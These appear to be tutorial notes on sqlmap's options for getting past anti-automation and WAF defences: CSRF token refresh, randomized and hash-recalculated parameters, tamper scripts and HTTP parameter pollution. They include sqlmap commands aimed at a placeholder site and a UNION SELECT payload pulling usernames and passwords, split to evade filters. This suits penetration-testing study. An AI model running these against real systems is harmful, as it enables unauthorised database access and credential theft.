
## 1. Anti-CSRF Token Bypass (`--csrf-token`)

### What is CSRF Token?

A website gives a **random token** with every request to verify the request is genuine.

Example:

```http
id=1&csrf-token=abc123
```

The token changes frequently.

### Problem

Automation tools fail because old token becomes invalid.

### Solution in sqlmap

Use:

```bash
--csrf-token="csrf-token"
```

### Example

```bash
sqlmap -u "http://site.com/" \
--data="id=1&csrf-token=abc123" \
--csrf-token="csrf-token"
```

### What sqlmap does

- Reads fresh token from response
    
- Automatically updates token
    
- Sends valid requests every time

# 2. Unique Value Bypass (`--randomize`)

### Concept

Some websites require a parameter to be different in every request.

Example:

```http
?id=1&rp=29125
```

`rp` must always change.

### Problem

Repeated same value = blocked request.

### Solution

```bash
--randomize=rp
```

### Example

```bash
sqlmap -u "http://site.com/?id=1&rp=12345" \
--randomize=rp
```

### What happens

sqlmap changes:

```http
rp=12345
rp=54321
rp=88888
```

Automatically for every request.

# 3. Calculated Parameter Bypass (`--eval`)

### Concept

Some websites calculate one parameter from another.

Example:

```http
id=1
h=MD5(1)
```

So:

```http
h=c4ca4238a0b923820dcc509a6f75849b
```

### Problem

If `id` changes, `h` must also change correctly.

### Solution

Use:

```bash
--eval
```

### Example

```bash
sqlmap -u "http://site.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \
--eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

### What sqlmap does

- Changes `id`
    
- Automatically recalculates hash `h`

# 5. WAF Bypass

## What is WAF?

Web Application Firewall blocks malicious payloads.

Examples:

- ModSecurity
    
- Cloudflare WAF
    

### What sqlmap does

It sends a fake malicious request:

```http
?pfov=...
```

If response changes (like HTTP 406), WAF likely exists.

# 7. Tamper Scripts (`--tamper`)

## Purpose

Modify payloads to bypass filters/WAF.

### Example

Normal:

```sql
UNION SELECT
```

Tampered:

```sql
uNiOn SeLeCt
```

or:

```sql
UNION/**/SELECT
```

---

## Common Tamper Scripts
| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |

# 9. HTTP Parameter Pollution (HPP)

## Concept

Split SQL payload into multiple parameters.

Instead of:

```http
?id=UNION SELECT username,password FROM users
```

Use:

```http
?id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

Server combines them.

### Purpose

Bypass WAF/filter rules.
